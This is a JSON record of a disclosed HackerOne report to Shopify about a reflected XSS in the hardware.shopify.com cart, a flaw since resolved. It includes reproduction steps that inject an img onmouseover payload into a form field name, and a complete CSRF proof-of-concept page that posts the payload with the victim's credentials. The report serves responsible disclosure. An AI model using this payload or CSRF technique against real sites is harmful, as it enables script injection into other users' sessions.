@@ -1,0 +1,120 @@
+{
+  "id": 95089,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTA4OQ==",
+  "url": "https://hackerone.com/reports/95089",
+  "title": "Reflected XSS in cart at hardware.shopify.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-10-21T23:11:40.534Z",
+  "submitted_at": "2015-10-21T23:11:40.534Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "juhhga",
+    "url": "/juhhga",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2015-12-22T19:57:07.548Z",
+  "bug_reporter_agreed_on_going_public_at": "2015-12-22T19:57:05.227Z",
+  "team_member_agreed_on_going_public_at": "2015-12-21T23:28:33.828Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "There is a reflected XSS at hardware.shopify.com in cart section. As there is no CSRF protetion for adding products to a cart, this one is a legitimate cross-user reflected XSS/HTML injection\n\nReproduction:\n1. Got to http://hardware.shopify.com/collections/gift-cards/products/custom-gift-card\n2. Select an image, click \"add to Cart\"\n3. Intercept the request and change the 'artwork file' parameter as follows:\nbefore: Content-Disposition: form-data; name=\"properties[Artwork file]\"\nafter: Content-Disposition: form-data; name=\"properties[Artwork file<img src='test' onmouseover='alert(2)'>]\";\n4. Forward the request, return to the cart, mouseover the image and see a popup.\n\nAltyernatively, use the following CSRF PoC:\n<html>\n  <body>\n    <script>\n      function submitRequest()\n      {\n        var xhr = new XMLHttpRequest();\n        xhr.open(\"POST\", \"http://hardware.shopify.com/cart/add\", true);\n        xhr.setRequestHeader(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\");\n        xhr.setRequestHeader(\"Accept-Language\", \"en-US,en;q=0.5\");\n        xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data; boundary=---------------------------13411895127118\");\n        xhr.withCredentials = true;\n        var body = \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"properties[Artwork file\\x3cimg src=\\'test\\' onmouseover=\\'alert(2)\\'\\x3e]\\\"; filename=\\\"test.png\\\"\\r\\n\" + \n          \"Content-Type: image/png\\r\\n\" + \n          \"\\r\\n\" + \n          \"\\x89PNG\\r\\n\" + \n          \"\\x1a\\n\" + \n          \"\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x00\\xc7\\x00\\x00\\x00\\xcc\\x08\\x02\\x00\\x00\\x00H\\xa0 R\\x00\\x00\\x00\\x01sRGB\\x00\\xae\\xce\\x1c\\xe9\\x00\\x00\\x00\\x04gAMA\\x00\\x00\\xb1\\x8f\\x0b\\xfca\\x05\\x00\\x00\\x00\\tpHYs\\x00\\x00\\x12t\\x00\\x00\\x12t\\x01\\xdef\\x1fx\\x00\\x00\\x01\\xfcIDATx^\\xed\\xd21\\x01\\x00\\x00\\x0c\\xc3\\xa0\\xf97\\xdd\\x99\\xc8\\t\\x1a\\xb8A\\xcd*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\xda\\xf6\\xe3\\xef\\xfb\\xfc\\x89u\\x11o\\x00\\x00\\x00\\x00IEND\\xaeB`\\x82\\r\\n\" + \n          \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"properties[Custom text line 1]\\\"\\r\\n\" + \n          \"\\r\\n\" + \n          \"\\r\\n\" + \n          \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"properties[Custom text line 2]\\\"\\r\\n\" + \n          \"\\r\\n\" + \n          \"\\r\\n\" + \n          \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"properties[Custom text line 3]\\\"\\r\\n\" + \n          \"\\r\\n\" + \n          \"\\r\\n\" + \n          \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"production-time\\\"\\r\\n\" + \n          \"\\r\\n\" + \n          \"standard\\r\\n\" + \n          \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"id\\\"\\r\\n\" + \n          \"\\r\\n\" + \n          \"976094353\\r\\n\" + \n          \"-----------------------------13411895127118--\\r\\n\";\n        var aBody = new Uint8Array(body.length);\n        for (var i = 0; i < aBody.length; i++)\n          aBody[i] = body.charCodeAt(i); \n        xhr.send(new Blob([aBody]));\n      }\n    </script>\n    <form action=\"#\">\n      <input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" />\n    </form>\n  </body>\n</html>\n",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 58279,
+      "file_name": "xss_hardware.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/058/279/d15ca405bbc527726f318a812474ee0a23417a91/xss_hardware.png?response-content-disposition=attachment%3B%20filename%3D%22xss_hardware.png%22%3B%20filename%2A%3DUTF-8%27%27xss_hardware.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4FDSZ6ZI%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T233649Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFYM%2B3eSco7O22aI40brIREhDrgxgT7XomFWIsRjVl0sAiEA0v83bkvP0RDHXgo9impzsRK7T5RvvWQ%2FRwI2vpm5CKsqsgUINBADGgwwMTM2MTkyNzQ4NDkiDHaZHUbTKhwC91r%2F8CqPBVltcPRUWtBHYj4OqjYIlHWYqX8RR3djNL55GC9j43eXHBzBUGavr03usbtzxZ%2F5zxXchAugk9KUOt7SI%2FKyjYkO3EUqNXGOumuFXDC8YpJlOQM1pe5KuChoQqLvrN98Uv3jRVAIpaycVb%2F9dSWduVMUI%2BWfM4Yv5MhHf8PPydfnOvRiV8ufpZONUZHCZubNcI4Ful%2F9p%2BdV8a5ncu2o4hC%2BgyWOww6tLG0T86U%2FuBanpDiIABc41cNJmI%2FTIDpOIr%2F6Rex5l9YAcrenjwSxAD%2BkKME8jQXK%2FC4R3BcXfXGs%2BqUHebbVbFrfnEr0X2NF7lu4zj9TA%2FwcwruVsEJBWcidQVtULfvv6hVjgO%2ByVu8xdb2rK17slc81PLAHhD%2F8WecSVk9aFx0%2F4NsO6yhs2sFtZKTpaVsWJ6vZW68k7XhA%2BR%2BxF1A2atmbwB5MXQGX2CeUZA0qxC639Tg9vlCmSGm%2BP2AFQe%2Faf8TXK7Nb1F9gNuSv%2BX4W3u7e4XAiHUtBEYAItkbPL62kNCCVFGi4KPzOB623chcZdtFyyhn17wrxMkpCQmcYdAENaZ8mUDYpSB%2B%2FBqPyUGF8dzMYv20okbaj7kjx1LAij54GvpVchQ7B9tDAvh%2B00hg7zgthIVWEdhjjQHXjvOGV%2BhQzTofNzPu81LJDgLTqtoHPzw360i%2BRiC7Qh%2F0qW9rlUdoXglMAxjWJmu6RH7aDDmUwavipPI5MCtnX2hrP2sAkQr2pfOwJfUsQXMuZ4aa7LKY3Glqm7kN6ouT6Ik7MBNDYf1OCE%2BX5MqRrXTuXL9OJgeFbUKbadTxA689iU8hOH6c8rBbMX18Fz2NyCJ%2BA0FgzrtGqDsU9mycsiPyb2yoAZPZeRd4w%2Fr%2FGxgY6sQH3YRDJjV0cuqspfs6jFM4vNSYr%2FojuLtyGF%2B3yaHHaXg7OsTJsybRJZ8CtnpOwuWyVfs0hv3ttH1taznZrNUH4%2F2XeDEp%2F4DaGmDg1kZNMM43U3AqqKfL9j92X5Jl2UPsts7Jza%2BahRHQBH5%2FXJ%2BGbaJsvGDWPt%2B7WuMDX8oxWyTOf89CUHLC7EohnkSARIsJVdJRybCN3cqj%2F3DavXyf4tMYt7A8hTkeOCddYby2XIjQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4f48012e3070be6c81b17e5dc6f1b0d41fb748680318f67b9c68105f07755c66",
+      "file_size": 65909,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-01-20T23:28:33.995Z",
+  "allow_singular_disclosure_after": -305251695.50556153,
+  "singular_disclosure_allowed": true,
+  "vote_count": 10,
+  "voters": [
+    "drsniper",
+    "ankitsingh",
+    "pr0f0x01",
+    "shivammusic",
+    "0x0days",
+    "mkerval",
+    "shine_",
+    "kinkoknik",
+    "booghi",
+    "0x7d7b"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
